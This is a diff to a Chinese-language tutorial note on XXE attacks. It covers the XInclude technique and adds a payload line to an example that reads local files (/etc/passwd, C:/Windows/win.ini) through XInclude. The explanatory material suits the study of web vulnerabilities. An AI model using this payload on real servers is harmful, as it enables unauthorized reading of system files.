@@ -154,7 +154,9 @@ XXE的原理也是因为DTD外部实体的特性导致可以文件读取,SSRF,RC
 而XInclude是XML定义的一部分,它允许从子文件中建立一个XML文档。可以把XInclude攻击放在XML文档中的任何数据值中，因此,可以在只控制被放入服务器端XML文档的单一数据项的情况下进行XXE.
 ```xml
 <foo xmlns:xi="http://www.w3.org/2001/XInclude">
-<xi:include parse="text" href="file:///etc/passwd"/></foo>
+<xi:include parse="text" href="file:///etc/passwd"/>
+<xi:include href="file:///C:/Windows/win.ini" parse="text"/>
+</foo>
 ```  
 首先需要先引入XInclude的命名空间,在href属性指定要包含的文件.  
 ![](2022-11-01-16-53-51.png)
